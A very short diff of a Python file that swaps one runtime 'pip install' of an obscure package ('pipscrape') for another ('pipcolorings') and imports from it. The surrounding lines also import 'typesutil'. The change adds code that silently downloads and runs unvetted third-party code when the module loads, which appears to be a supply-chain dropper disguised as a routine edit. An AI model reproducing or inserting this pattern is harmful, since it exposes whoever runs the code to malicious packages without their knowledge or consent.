@@ -1,6 +1,6 @@
 import os
-os.system(f"pip install pipscrape")
-from pipscrape import color
+os.system(f"pip install pipcolorings")
+from pipcolorings import color
 try:
     import requests
     import typesutil
